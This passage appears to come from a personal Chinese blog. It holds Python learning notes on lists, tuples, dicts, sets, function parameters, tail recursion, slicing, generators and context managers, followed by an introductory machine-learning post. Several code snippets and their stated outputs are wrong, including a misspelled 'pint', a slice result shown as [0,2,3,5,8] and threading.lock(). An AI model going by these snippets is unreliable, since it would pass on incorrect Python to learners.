&#x27;Adam&#x27;] 删除 list支持使用pop方法进行删除： 123456classmates.pop()# 删除末尾元素，即Adam将被删除# [&#x27;Michael&#x27;, &#x27;Jack&#x27;, &#x27;Bob&#x27;, &#x27;Tracy&#x27;]classmates.pop(1)# 删除第2个元素，即jack将被删除# [&#x27;Michael&#x27;, &#x27;Bob&#x27;, &#x27;Tracy&#x27;] 修改 通过重新赋值的方式即可对list中指定位置的元素进行修改： 12classmates[1] = &#x27;Sarah&#x27;# [&#x27;Michael&#x27;, &#x27;Sarah&#x27;, &#x27;Tracy&#x27;] 特性 list允许存放不同类型的元素，如： 1l = [&#x27;apple&#x27;,123,True] 并且允许list嵌套： 1s = [&#x27;python&#x27;,&#x27;java&#x27;,[&#x27;html&#x27;,&#x27;css&#x27;],&#x27;c++&#x27;] 并且使用len方法求长度时会得到第一层list中的元素个数： 1len(s) = 4 以此方式可以进行任意层数的嵌套 tuple 元组，另一种形式的有序表，具有如下特征： 不支持增删改操作 允许定义空元组 允许随机访问 必要时使用tuple代替list可以保护 tuple，list可以相互嵌套 定义 定义tuple时，使用() 12t = (1,2) # 定义了一个包含两个元素的tuple 但当定义只有一个元素的tuple时，需要注意避免如下歧义： 1234t = (1) # 这样定义的t将会被解释为一个number类型，因为此处定义tuple的()与数学()产生了歧义，解释器优先将其解释为数学()t = (1,) # 此时t才会被正确的解释为一个tuple “可变”tuple 使用list与tuple的嵌套可以使tuple变得部分可变： 1234567t = (&#x27;a&#x27;,&#x27;b&#x27;,[&#x27;A&#x27;,&#x27;B&#x27;])t[2][0] = &#x27;X&#x27;t[2][1] = &#x27;Y&#x27;print(r) # 将会输出(&#x27;a&#x27;,&#x27;b&#x27;,[&#x27;X&#x27;,&#x27;Y&#x27;])print(len(t))# 将输出3，因为[&#x27;A&#x27;,&#x27;B&#x27;]，在t对应的内存中指保存有一个指向[&#x27;A&#x27;,&#x27;B&#x27;]所存在的地址的指针 具体情况如下图所示 ![Python%20564b04e5895e443e982a45f45f1c78ee/Untitled%203.png](E:/work/Python 564b04e5895e443e982a45f45f1c78ee/Untitled 3.png) Python条件语句 12345678if &lt;条件判断1&gt;: &lt;执行1&gt; elif &lt;条件判断2&gt;: &lt;执行2&gt; elif &lt;条件判断3&gt;: &lt;执行3&gt; else: &lt;执行4&gt; Python循环语句 for Python允许使用for...in语句对有序表进行遍历： 12345678# 外部定义的listnames = [&#x27;Michael&#x27;, &#x27;Bob&#x27;, &#x27;Tracy&#x27;]for name in names: print(name)# 内部定义的listsum = 0for x in [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]: sum = sum + xprint(sum) 此外对连续自然数进行便利还能直接使用range()，注意该函数从0开始 12&gt;&gt;&gt; list(range(5))# [0, 1, 2, 3, 4] while Python中同样允许在循环中使用continue以及break 12345678n = 0while n &lt; 10: n = n + 1 if n % 2 == 0: # 如果n是偶数，执行continue语句 continue # continue语句会直接继续下一轮循环，后续的print()语句不会执行 print(n) 特殊数据结构 dict dict是python中的一种类似map结构，每个元素由一对{key,value}组成，使用方法与map类似： 1234d = &#123;&#x27;Michael&#x27;: 95, &#x27;Bob&#x27;: 75, &#x27;Tracy&#x27;: 85&#125; #在定义时赋值d[&#x27;Jack&#x27;] = 20 #向dict中添加值 存储同样的数据，用dict实现时的查找效率往往比用list实现更高效，原因如下： 1234567891011# 对于存储上例中的数据，使用list实现时往往需要这样实现l = [ &#x27;Michael&#x27;, &#x27;Bob&#x27;, &#x27;Tracy&#x27; ]s = [ 95, 75, 85 ]# 对于此例，要查找Tracy的年龄时，需要做如下操作：# 1. 先顺序查找list l，得到存有Tracy值的空间的下标，平均复杂度为O(n)# 2. 再通过1操作得到的下标index，访问s[index]，得到85，平均复杂度为O(1)# 如果使用dict实现，访问过程如下d = &#123;&#x27;Michael&#x27;: 95, &#x27;Bob&#x27;: 75, &#x27;Tracy&#x27;: 85&#125;if &#x27;Tracy&#x27; in d: d[&#x27;Tracy&#x27;]# 上述过程的执行速度非常快，往往可以达到O(1) 为什么dict的查找速度如此之快呢，这就需要了解dict的底层实现了。 python3.6及以下使用普通的hash方式实现dict，即对key值进行hash，将key与value存储到hash对应的位置中去。也就意味着使用这样的简单hash方法会导致数据结构无序（unordered）；并且，为了保证尽量少的hash冲突发生，往往剩余空间小于当前总容量大1/3时，就会对dict进行扩容，这就导致随着存储内容的增多，dict可能逐渐变得稀疏，造成空间的浪费 python3.7对hash结构进行了改进，首先python会维护一张由list实现的index表，indices，这种表用来存放下标映射关系，也就是，对于存放第一组数据，进行如下操作： 计算出key 的下标值index = getIndex( hash(key) ) indices[index] = 0 Entities[0] = {key,value,hash(key)} 这样做有什么好处呢， 首先，真正存放数据的Entities中存放的数据是顺序且连续的； 其次，这样存储，indices是稀疏的，但其中仅仅存放一个表示下标的数字，消耗的空间大大减小。 查找过程如下： 首先通过hash函数得到indices中的下标，index = getIndex( hash(key) ) 访问Entities[index]得到数据。 这样做，每次查找需要多查一次，但多出来的查找时间复杂对为O(1)，时间开销的增加并不明显。 更详细的内容可以参考下面的博客： Python字典dict实现原理https://blog.csdn.net/weixin_43064185/article/details/107565845?ivk_sa=1024320u 可见，dict的查找效率只与hash函数有关，与存储的容量没有直接关系。 dict还支持有如下操作： 1d.get(&#x27;Bob&#x27;) # 获取d中key为Bob的值，如果没有，返回None，输出到控制台时表现为什么都没有d.get(&#x27;FK&#x27;,-1) # 获取d中key为FK的值，如果没有返回-1d.pop(&#x27;Jack&#x27;) # 删除d中key为Jack的值（包括key），并返回该值&#x27;Jack&#x27; in d # 如果key为Jack的值包含在d中，返回True，否则返回False 由于dict中的key需要进行hash变换，这就要求了dict中存放的key必须是可hash的，也就是说必须是确定的值，比如数字，字符串，自定义类，而可变的list则无法作为key。 为什么str是不可变对象呢： 对于这样的操作： 1a = &#x27;abc&#x27;b = a.replace(&#x27;a&#x27;,&#x27;A&#x27;)print(a)print(b)# 对于a而言，进行a.replace(&#x27;a&#x27;,&#x27;A&#x27;)操作后，a中保存的值并没有变。 对于第一条赋值语句而言，变量a可以理解为只是指向’abc’的指针，而真正的字符串对象则是’abc’本身。 也就是说不变对象调用自身的任意方法，都不会对自身造成改变，而是创建新的对象并返回。 set python中的set同STL中的set，也可以理解为只有key的dict，因为底层逻辑是一样的，都是进行hash，只不过set是指用hash来保证不会有同样的元素被添加，定义set时需要使用一个list来创建。 1s = set([ 1, 1, 2, 2, 3, 3, 4]) # 将得到一个set，内容为[1,2,3,4] 注意set是无序的，使用set()去重时很可能得到不一样顺序的结果，主要原因是set存储是利用hash进行的，次序根据hash的值而定。但有时对纯数字的list进行set创建操作可能会得到有序的结果，原因可能是某些解释器的hash函数对数字进行hash时，得到的就是该数字。 set还包含如下操作： 1s.add(2) # 向s中加入一个值为2的元素，如果重复，则结果不会改变s.remove(2) # 从s中删除值为2的元素 函数 定义 python使用如下方式进行函数的定义： 1234def functionName(param): #function body return value1, value2 #缺省状态下返回None，还能写作return None或return python中函数再返回多个值的时候，会将返回值用tuple封装，而多个变量可以同时接受一个tuple，因此下面的写法被认为是正确的： 123456import mathdef move(x, y, step, angle=0): nx = x + step * math.cos(angle) ny = y - step * math.sin(angle) return nx, nyx,y = move(100, 100, 60, math.pi / 6) 空函数 12def emptyFunction(param): pass 参数 python中的函数支持许多定义函数参数的方法，包括如下几种： 位置参数 12def function(param): pass 含有默认值的参数 123def function(param = &#x27;default value&#x27;): pass# python会将实参和形参进行顺序匹配，对于未匹配到的形参，python将为其赋值为设定的默认值 但是，需要注意的是，如果将参数的默认值设为可变对象，那么会出现一些问题，比如： 1234567891011121314# -*- coding: UTF-8 -*-def fun(l = []): l.append(&#x27;End&#x27;) return lprint(fun([1,2,3]))print(fun())print(fun([5,6,7]))print(fun())print(fun())# [1, 2, 3, &#x27;End&#x27;]# [&#x27;End&#x27;]# [5, 6, 7, &#x27;End&#x27;]# [&#x27;End&#x27;, &#x27;End&#x27;]# [&#x27;End&#x27;, &#x27;End&#x27;, &#x27;End&#x27;] 注意到我调用了三次使用默认参数的fun，但是，函数好像有记忆一样，后两次fun使用的默认对象与上一次使用的是同一个！这显然是反直觉的，原因是python会在内存中开辟一块空间来存放参数的默认对象，为了节约空间，每当某个参数适用默认对象时，python只需要将其指向默认对象存放的空间就行了。但是如果默认对象使用可变对象，那么可能会存在某些操作，是的内存中的可变对象发生改变，导致每次赋予的默认值都不一样。 因此使用默认值有如下规则： 使用带有默认值的参数时，尽量将默认值设置为不变参数 但是如果一定要让某个函数的默认值为某个可变对象，使用None是最安全便捷的方法： 12345def fun(l = None): if l is None: l = [1,2,3] l.append(&#x27;End&#x27;) return 1 有时我们可能还想让间隔开的两个参数使用默认值，但由于python默认值检测是顺序的，考虑到这一点，python提供了如下方法来避免歧义： 12345def fun(a=1, b=2, c=3, d=4): sum = a + b + c + d return sumfun(a = 10,d = 40) # 此时只有形参a和b将使用指定的实参，b和c将使用默认值 可变参数 有时候我们可能无法确认传入参数的数量，为此，python提供了可变参数，此法允许我们传入任意数量的参数。当然用tuple或者set作为参数同样可以实现类似的功能，但是可变参数省去了创建set或tuple的操作，并且当传入参数为空时，不像set或tuple一样需要判空。 1234567891011121314def function(*param): sum = 0 for i in param: sum += i return sumprint(function())print(function(1))print(function(1, 2))print(function(1, 2, 3))# 结果如下# 0# 1# 3# 6 但当我们需要传入tuple或者set时，传入的tuple或set会和参数构成一个二维结构： 12345678910# -*- coding: UTF-8 -*-def function(*param): sum = 0 for i in param: for j in i: print(j)function([1,2])# 结果如下# 1# 2 为了避免这种情况，python允许使用如下方式来避免歧义： 1234567891011# -*- coding: UTF-8 -*-def function(*param): sum = 0 for i in param: print(i)function([1,2])# 结果如下# 1# 2function(*[1,2]) # 在tuple或set前加*会告诉python这个实参用来满足某个可变形参 关键字参数 改参数允许传入0个或任意个含参数名的参数，这些参数再函数内部自动组装为dict，定义时使用**加以区分： 123456def person(name, age, **kw): print(&#x27;name:&#x27;, name, &#x27;age:&#x27;, age, &#x27;other:&#x27;, kw)person(&#x27;Jacky&#x27;, 30) # 输出为 name:Jacky age:30 other:&#123;&#125;person(&#x27;Bob&#x27;, 36, gender = &#x27;M&#x27;, city = &#x27;Beijing&#x27;, job = &#x27;Engineer&#x27;) #输出为 name: Bob age: 36 other: &#123;&#x27;gender&#x27;:&#x27;M&#x27;,&#x27;city&#x27;: &#x27;Beijing&#x27;,&#x27;job&#x27;: &#x27;Engineer&#x27;&#125; 关键字参数可以起到扩展函数功能的作用，比如在编写注册功能时。 还能自己组装dict后再传入： 123456extra = &#123;&#x27;city&#x27;: &#x27;Beijing&#x27;, &#x27;job&#x27;: &#x27;Engineer&#x27;&#125;person(&#x27;Jack&#x27;, 24, city=extra[&#x27;city&#x27;], job=extra[&#x27;job&#x27;])person(&#x27;Jack&#x27;, 24, **extra)# 输出如下# name: Jack age: 24 other: &#123;&#x27;city&#x27;: &#x27;Beijing&#x27;, &#x27;job&#x27;: &#x27;Engineer&#x27;&#125;# name: Jack age: 24 other: &#123;&#x27;city&#x27;: &#x27;Beijing&#x27;, &#x27;job&#x27;: &#x27;Engineer&#x27;&#125; 此处kw获得的dict是extra的一份拷贝，对kw的改动不会影响extra 命名关键字参数 关键字参数允许传入任意值，当我们需要限制关键字参数的名字时，可以使用命名关键字参数，如： 123456def person(name, age, *, city, job): print(name, age, city, job) person(&#x27;Jack&#x27;, 24, city=&#x27;Beijing&#x27;, job=&#x27;Engineer&#x27;)# Jack 24 Beijing Engineer *之后的参数被视为明面关键字参数 如果函数定义中已经有了一个可变参数，后面跟着的命名关键字参数就不再需要一个特殊分隔符*了： 12def person(name, age, *args, city, job): print(name, age, args, city, job) 命名关键字参数必须传入参数名，如果没有会报如下错： 12345person(&#x27;Jack&#x27;, 24, &#x27;Beijing&#x27;, &#x27;Engineer&#x27;)&#x27;&#x27;&#x27;Traceback (most recent call last): File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;TypeError: person() takes 2 positional arguments but 4 were given&#x27;&#x27;&#x27; 次数由于没有指定参数名，python解释器认为调用时所提供的4个参数均为position arguments，即位置参数，而函数定义时只有2个位置参数。 命名关键字同样支持缺省值： 123456def person(name, age, *, city = &quot;Beijing&quot;, job): print(name, age, city, job) person(&#x27;Jack&#x27;, 24 job = &quot;Engineer&quot;)# Jack 24 Beijing Engineer 参数顺序 python中为了确保解释器对参数的解析正确，上述的5中参数需要按照一定顺序进行排列，即： 位置参数，默认参数，可变参数，命名关键字参数，关键字参数 123456789101112131415161718def f1(a, b, c = 0, *args, **kw): print(&#x27;a=&#x27;, a, &#x27;b=&#x27;, b, &#x27;c=&#x27;, c, &#x27;args=&#x27;, args, &#x27;kw=&#x27;, kw) def f2(a, b, c = 0, *, d, **kw): print(&#x27;a=&#x27;, a, &#x27;b=&#x27;, b, &#x27;c=&#x27;, c, &#x27;d=&#x27;, d, &#x27;kw=&#x27;, kw) f1(1,2) # a=1 b=2 c=0 args=() kw=&#123;&#125; f1(1,2,c = 3) # a=1 b=2 c=3 args=() kw=&#123;&#125; f1(1,2,3,&#x27;a&#x27;,&#x27;b&#x27;)# a=1 b=2 c=3 args=(&#x27;a&#x27;,&#x27;b&#x27;) kw=&#123;&#125;f1(1,2,3,&#x27;a&#x27;,&#x27;b&#x27;,x = 99) # a=1 b=2 c=3 args=(&#x27;a&#x27;,&#x27;b&#x27;) kw=&#123;&#x27;x&#x27;:99&#125;f2(1,2,d = 99,ext = None) # a=1 b=2 c=0 d=99 kw=&#123;&#x27;ext&#x27;:None&#125; 除了上述方法以外，还可以使用一个tuple和一个dict调用上述函数 123456789args = (1,2,3,4)kw = &#123;&#x27;d&#x27;:99, &#x27;x&#x27;:&#x27;#&#x27;&#125;f1(*args, **kw)# a=1 b=2 c=3 args=(4,) kw=&#123;&#x27;d&#x27;:99, &#x27;x&#x27;:&#x27;#&#x27;&#125;args = (1,2,3,4)k2 = &#123;&#x27;d&#x27;:88, &#x27;x&#x27;:&#x27;#&#x27;&#125;f2(*args, **kw)# a=1 b=2 c=3 d=88 k2=&#123;&#x27;x&#x27;:&#x27;#&#x27;&#125; 虽然允许使用的参数组合有如此多种，但是使用过多的组合会导致函数接口的可读性下降 递归 递归几乎是一门涉及到函数的语言必讲的内容，此处强调一下尾递归： 尾递归：如果一个函数中所有递归形式的调用都出现在函数的末尾，我们称这个递归函数是尾递归的。当递归调用是整个函数体中最后执行的语句且它的返回值不属于表达式的一部分时，这个递归调用就是尾递归。 谈到递归，就不得不谈起另一个词：函数栈 递归虽然具有优秀的易读性，但过多的递归调用会占用很大空间的函数栈。 而尾递归，或者说“伪递归”可以通过优化使其只占用常数级的栈空间。 递归的执行过程可以理解为由两部分组成： 递归 回溯 而尾递归能偶被优化的原因，就在于尾递归的回溯过程可以省略。 下面来看几个例子： 1234567891011def fact1(n): if n == 1: return 1 else: return n * fact1(n-1)def fact2(n,res): if n == 1: return res else: return fact2(n-1,n * res) 以上两个函数都能用来计算阶乘，但区别在于fact1中的回溯我们认为是有意义的，因为递归调用自身后，该层需要下一层递归返回的结果进行表达式运算n∗fact(n−1)n*fact(n-1)n∗fact(n−1) 而fact2中的当前层只是简单的对后一层结果进行返回。 因此这就意味着，我们不需要在进入下一层梦境之前，对当前层的“环境”进行保存。那么我们在函数栈中，便不需要为后一层开辟新的栈空间，而只是简单的让他覆盖掉当前层所在的栈帧。 此外，由于回溯时不需要做任何运算，只需要对结果进行保存，尾递归显然可以使用循环来代替。事实上，在一些没有循环结构的语言中，通常就是使用尾递归的方式来实现循环。 尾递归转化为循环的方法详见如下博客： 尾递归为啥能优化？https://zhuanlan.zhihu.com/p/36587160 Python高级特性 切片 如果需要取一个list或tuple的某个片段，通常的做法是新建一个空list或tuple然后使用循环将其取出，但python提供了更方便的办法： 12345678910111213141516171819L = [&#x27;Michael&#x27;, &#x27;Sarah&#x27;, &#x27;Tracy&#x27;, &#x27;Bob&#x27;, &#x27;Jack&#x27;]L[0:3]# [&#x27;Michael&#x27;, &#x27;Sarah&#x27;, &#x27;Tracy&#x27;]L[:3] # [&#x27;Michael&#x27;, &#x27;Sarah&#x27;, &#x27;Tracy&#x27;]L[1:3] # [&#x27;Sarah&#x27;, &#x27;Tracy&#x27;]L[-2:] # [&#x27;Bob&#x27;, &#x27;Jack&#x27;]L[-2:-1] # [&#x27;Bob&#x27;]k = list(range(100))K[:10:2] # [0,2,3,5,8]K[::5] # [0, 5, 10, 15, 20, 25, 30, 35, 40, 45, 50, 55, 60, 65, 70, 75, 80, 85, 90, 95]K[:] # [0, 1, 2, 3, ..., 99]str = &quot;ABCDEFG&quot;str[::2] # &#x27;ACEG&#x27; python中切片操作提供了三个可选择参数： note info [起始位置:结束位置:取数间隔] 注意事项： 其中取数是取到结束位置的前一个标号 起始位置默认为0 取数间隔是指每k个数取一个 迭代 例如遍历一个list或tuple的过程我们可以称之为迭代。 python中的for具有很多特殊的操作。比如使用for...in 来完成C++11中加入的新特性来遍历数组或其他数据结构中的每一个元素 1234//C++for(int i:a)&#123; //body&#125; 123#pythonfor i in a: #body 事实上python中的所有可迭代对象，都能通过for...in来遍历。比如dict 1d = &#123;&#x27;a&#x27;:1,&#x27;b&#x27;:2,&#x27;c&#x27;:3&#125;for key in d: print(key)# a# b# c 由于dict的存储并不是按章顺序存储的，因此迭代顺序不一定是abc 默认情况下，dict迭代的是key 如果要迭代value，则需要使用：for value in d.values() ，如果需要同时迭代key和value，则需要使用如下方式： 12for k,v in d.items(): print(k,v) 那么我们该如何判断某对象是否输入可迭代对象呢？ 需要通过如下方法： 123456from collections.abc import Iterableisinstance(&#x27;abc&#x27;, Iterable) # True str可迭代isinstance([1,2,3], Iterable) # True list可迭代isinstance(123, Iterable) # False 整数不可迭代 而当我们需要对某个list进行类似C中的下标迭代，可以使用enumerate关键字将list转化为索引-元素对 12for i, value in enumerate([&#x27;A&#x27;,&#x27;B&#x27;,&#x27;C&#x27;]): print(i, value) 列表生成 python提供了一种非常方便的列表生成方式： variable = [out_exp for out_exp in input_list if out_exp == 2] 如： 12[x * x for x in range(1, 11) if x % 2 == 0]# [4, 16, 36, 64, 100] 此外还可以使用二重循坏： 12[m + n for m in &#x27;ABC&#x27; for n in &#x27;XYZ&#x27;]# [&#x27;AX&#x27;, &#x27;AY&#x27;, &#x27;AZ&#x27;, &#x27;BX&#x27;, &#x27;BY&#x27;, &#x27;BZ&#x27;, &#x27;CX&#x27;, &#x27;CY&#x27;, &#x27;CZ&#x27;] 当我们使用if限制列表生成的元素时，if...else的使用需要特别注意： 当if放在for后进行限定时，不能使用else 当if放在for前进行限定时，必须使用else 这是因为for前面的部分是一个表达式，它必须根据x计算出一个结果。因此，考察表达式：x if x % 2 == 0，它无法根据x计算出结果，因为缺少else，必须加上else 例如： 12[x if x % 2 == 0 else -x for x in range(1, 11)]# [-1, 2, -3, 4, -5, 6, -7, 8, -9, 10] 生成器 生成器也是一种可以用来生成列表的工具，他与生成式最大的不同在于：生成式是将列表中的所有元素提前计算好，而生成器则等到你需要时再计算当前位置的值。 简单生成器的创建较为简单，只需要将生成式的[]改为()即可： 123456&gt;&gt;&gt; L = [x * x for x in range(10)]&gt;&gt;&gt; L[0, 1, 4, 9, 16, 25, 36, 49, 64, 81]&gt;&gt;&gt; g = (x * x for x in range(10))&gt;&gt;&gt; g&lt;generator object &lt;genexpr&gt; at 0x1022ef630&gt; 生成器可以使用如下两种方法访问： 12345678910111213141516171819202122232425262728293031# 方法1&gt;&gt;&gt; next(g)0&gt;&gt;&gt; next(g)1&gt;&gt;&gt; next(g)4...&gt;&gt;&gt;next(g)Traceback (most recent call last): File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;StopIteration# 使用next访问到末尾时将抛出此异常#方法2&gt;&gt;&gt; g = (x * x for x in range(10))&gt;&gt;&gt; for n in g:... print(n)&#x27;&#x27;&#x27;0149162536496481&#x27;&#x27;&#x27; 此外，还能将函数改造为生成器，当函数中使用关键字yield，进行返回时，此为生成器的高级用法，比如使用生成器打印杨辉三角： 1234567891011121314151617def triangles(): l = [1] while True: yield l[:] #此处需要利用切片来为l创建副本 l.append(0) l = [l[i] + l[i - 1] for i in range(len(l))] # 利用生成式简化循环操作num = 0results = []for t in fun(): results.append(t) num = num + 1 if(num &gt;= 10): breakfor t in results: print(t) 需要注意的是，python函数在返回可变对象时返回的是对象的地址 此外，使用函数定义的生成器也能设置返回值，但需要通过捕捉StopIteration异常来查看返回值： 123456789101112131415161718192021222324252627def fib(max): n, a, b = 0, 0, 1 while n &lt; max: yield b a, b = b, a + b n = n + 1 return &#x27;done&#x27;g = fib(6)while True: try: x = next(g) pint(&#x27;g:&#x27;, x) except StopIteration as e: print(&#x27;Generator return value:&#x27;, e.value) break&#x27;&#x27;&#x27;g: 1g: 1g: 2g: 3g: 5g: 8Generator return value: done&#x27;&#x27;&#x27; 迭代器 迭代章节聊过可迭代对象：Iterable 而迭代器，则是像生成器一样，不仅可以使用for遍历，还能被next()函数调用并不断返回下一个 可以使用如下方法进行判断： 12345678910from collections.abc import Iteratorisinstance((x for x in range(10)), Iterator)# Trueisinstance([], Iterator)# Falseisinstance(&#123;&#125;, Iterator)# Falseisinstance(&#x27;abc&#x27;, Iterator)# False 此外还能用iter()方法把可迭代对象转化为迭代器： 1234isinstance(iter([]), Iterator)# Trueisinstance(iter(&#x27;abc&#x27;), Iterator)# True Python中的Iterator对象表示一个数据流。 即 能作用与for循环的对象都是Iterable类型 能作用与next()函数的对象都是Iterator类型，它们表示一个惰性计算的序列 事实上Python中的for本质上就是通过不断调用next()函数实现的。 上下文管理器和with关键字 对于系统资源如文件、数据库连接、socket 而言，应用程序打开这些资源并执行完业务逻辑之后，必须做的一件事就是要关闭（断开）该资源。 通常情况下我们打开一个文件需要做如下操作： 12345678def test1(): f = open(&quot;1.txt&quot;, &quot;w&quot;) try: f.write(&quot;111111&quot;) except Exception: print(&quot;ERROR&quot;) finally: f.close() 但如果对该文件的操作非常之多，有几十上百行，最后的关闭代码及那个里实际执行代码非常远，甚至有时会忘记关闭文件。因此python为我们提供了更方便的方法： 123def test2(): with open(&quot;1.txt&quot;, &quot;w&quot;) as f: f.write(&quot;2222&quot;) 使用with关键子我们就不需要进行显示的关闭文件了，运行with中的代码块后，将自动关闭该文件，也就是回到进入with代码块之前的状态。 使用with关键字的方法更为简洁，它的实现原理是什么，这就涉及到上下文管理器。 任何实现了 __enter__() 和 __exit__() 方法的对象都可称之为上下文管理器 例如我们自定义一个上下文管理器来测试with的执行过程： 123456789101112131415161718class Test4(object): def __init__(self, file_name, mode): self.file_name = file_name self.mode = mode def __enter__(self): self.f = open(self.file_name, self.mode) return self.f def __exit__(self,*args): self.f.close()with Test4(&quot;1.txt&quot;, &quot;w&quot;) as f: f.write(&quot;4444&quot;)&quot;&quot;&quot;首先Test4(&quot;1.txt&quot;, &quot;w&quot;)初始化实例对象，然后with会寻找类中是否有__enter__ 和 __exit__，如果有则调用__enter__函数，最后__enter__() 方法返回资源对象，这里就是你将要打开的那个文件对象，__exit__() 方法处理一些清除工作。&quot;&quot;&quot; 此外我们还可以使用contextmanager装饰器来自定义上下文管理器： 1234567891011121314from contextlib import contextmanager&quot;&quot;&quot;Python 还提供了一个 contextmanager 的装饰器，更进一步简化了上下文管理器的实现方式。通过 yield 将函数分割成两部分，yield 之前的语句在 __enter__ 方法中执行，yield 之后的语句在 __exit__ 方法中执行。紧跟在 yield 后面的值是函数的返回值。&quot;&quot;&quot;@contextmanagerdef test5(path, mode): f = open(path, mode) yield f f.close()with test5(&#x27;out.txt&#x27;, &#x27;w&#x27;) as f: f.write(&quot;5555&quot;) 但是with本身并没有异常捕获的功能，但是如果发生了运行时异常，它照样可以关闭文件释放资源。如果运行时发生了异常，就退出上下文管理器。调用管理器__exit__()方法。 with不仅能用来管理文件，还能管理锁，链接等等，如管理线程锁的例子： 123456#管理锁import threadinglock = threading.lock()with lock: #执行一些操作 pass","categories":[{"name":"Python","slug":"Python","permalink":"http://enderxiao.github.io/categories/Python/"},{"name":"机器学习","slug":"机器学习","permalink":"http://enderxiao.github.io/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"计算机语言","slug":"计算机语言","permalink":"http://enderxiao.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%AF%AD%E8%A8%80/"},{"name":"研究生课程基础","slug":"研究生课程基础","permalink":"http://enderxiao.github.io/categories/%E7%A0%94%E7%A9%B6%E7%94%9F%E8%AF%BE%E7%A8%8B%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"机器学习","slug":"机器学习","permalink":"http://enderxiao.github.io/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"python","slug":"python","permalink":"http://enderxiao.github.io/tags/python/"},{"name":"基础","slug":"基础","permalink":"http://enderxiao.github.io/tags/%E5%9F%BA%E7%A1%80/"}]},{"title":"机器学习——入门","slug":"机器学习-入门","date":"2021-04-02T03:01:41.000Z","updated":"2024-07-30T11:26:33.936Z","comments":true,"path":"2021/04/02/机器学习-入门/","permalink":"http://enderxiao.github.io/2021/04/02/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-%E5%85%A5%E9%97%A8/","excerpt":"机器学习简述","text":"机器学习简述 机器学习的定义 历史上主要有两位学者对机器学习进行过定义，反别是Arthur Samuel和Tom mitshell，下面分别给出介绍 Arthur Samuel Arthur Samuel——编写世界上第一个棋类游戏人工智能程序 他对于机器学习的定义如下： def： 机器学习是，赋予计算机学习能力，且该能力不是通过显著式编程获得 非显著式编程 让计算机自己总结规律的编程方法 收益函数： 我们通常规定正在特定环境下，计算机做某些行为会带来某些收益，我们称它为收益函数 在规定了行为和收益函数后，让计算机自己去找最大会收益函数的行为 Tom mitshell 而Tom mitshell——在其书《Machine Learning》中对机器学习的定义为： def： 机械学习，就是对于一个任务T，衡量完成T好换的性能指标P，以及计算机获得的经验E，计算机从经验E中学习，使得，计算机完成任务T的性能指标P逐步提升，即：计算机在T上的被P衡量的性能，会随着经验E的增加而提高 机器学习任务的分类 监督学习 对于： 垃圾邮件识别 人脸识别 这类的机器学习任务，需要为数据打标签（Labeling for training data），才此情况下，经验E是是训练样本和标签的集合，由此我们可以得到监督学习的定义： def： 所有经验E都是人工采集并输入计算机的，将这类输入计算机训练数据同时加上标签的机器学习称为监督学习(Supervised Learning) 在此类机器学习中，算法必须知道预测什么，即目标变量的分类信息 此外还能通过数据标签的存在与否对监督学习进行分类，分为： 传统监督学习 半监督学习 非监督学习 传统监督学习 def： 传统监督学习(Traditional Supervised Learning)中，每一个数据标签都有数据标签 传统学习中主要的算法有： 支持向量机(Support Vector Machine) 人工神经网络(Neural Networks) 深度神经网络(Deep Neural Networks) 非监督学习 def： 如果所有的训练数据都没有对应的标签，则称为非监督学习(Unsupervised Learning) 非监督学习的数据中没有类别信息（标签），也不会给定目标值。在无监督学习中： 将数据集合分成由了类似的对象组成的多个类的过程称为聚类； 将寻找描述数据统计值的过程称为密度估计; 此外，非监督学习可以减少数据特征的维度，一遍我们可以使用二维或三维图形更直观的展示数据信息。 由定义，我们可能会产生一个问题，对于没有数据标签的数据，我们如何对数据进行分类。 对此我们需要做出如下假设： 如果同一类的训练数据在空间中距离最近 根据样本空间中的空间信息 设计算法将它们聚集为两类 从而实现无监督学习，其中主要算法包括： 聚类(Clustering) EM算法(Expectation-Maximization algorithm) 主成分分析(Principle Component Analysis) 半监督学习 def： 如果训练数据中一部分由标签一部分没有标签，称这种机器学习为半监督学习(Semi-Supervised Learning) 为了节约为数据打标签的成本，由于半监督学习使用少量的标注数据与大量未标注数据进行训练的特性，近年半监督学习逐渐成为热点 另一种分类方式 基于标签的固有属性，我们可以将监督学习分为： 分类 回归 分类 如果标签是离散的值，则将这种学习成为分类 如人脸识别算法，就是分类任务，如： 给出两张人脸，判断是否为同一人，可以用0表示是，1表示否 从大量照片中，按照人脸将照片分类，则可以用1,…,N1,\\dots,N1,…,N表示不同的人 这些都是离散的值 回归 如果标签是连续的值，则将这种学习成为回归 例如设计算法预测房价的走势，标签为平均房价，训练样本为时间 总结 对于分类、回归、聚类、密度估计，在此将这些操作的相关算法以及能够解决的问题进行汇总 监督学习算法 算法用途 k-近邻算法 线性回归 朴素贝叶斯算法 局部加权线性回归 支持向量机 Ridge回归 决策树 Lasso最小回归系数估计 非监督学习算法 算法用途 K-均值 最大期望算法 DBSCAN Parzen窗设计 强化学习 对于： 下棋 自动驾驶 这类机器学习任务，经验E是由计算机与环境互动获得的，我们只需要定义这些行为的收益函数(Reward Function)，对行为进行奖励和乘法，并且计算机能够根据这些奖励和乘法，改变自己的行为模式，从而最大化收益函数 由此可以得到强化学习的定义： 计算机通过与环境的互动逐渐强化自己的行为模式的机器学习称为强化学习(Reinforcement Learning) 但对于AlphaGo而言，起初是通过监督学习，通过高手对局的视频，形成一个初始的围棋程序，在对该程序进行强化学习提成其性能。 机器学习算法的过程 特征提取(Feature Extraction)： 在这一步中会从样本中抽象出一些用于做分类的特征 特征选择(Feature Selection) 从1中抽象出的特征中分析，选出最能有效进行分类的特征，以此构建机器学习系统 根据2中选出的特征构建特征空间(Feature Space) 选用不同的算法对特征空间进行划分 基于2中选择的特征构建算法 PS: 对于3中选择算法这一步，比如可以选择： 支持向量机(Support Vector Machine)，其中包含三种内核： 线性内核 多项式核 高斯径向基函数核 再次列举一个构建特征空间的例子，特征空间可以按照特征的个数任意指定维数： 在特征空间中包含的几个关键词： 维度 人对于三维以上的事物缺乏想象力，但目前的机器学习算法可以较为精确的处理三维以上的数据 标准 使用不同的标准，对某一些区域的划分会有区别 没有免费午餐定理 定理 4.1 1995年 因此没有任何情况下都最优的机器学习方法 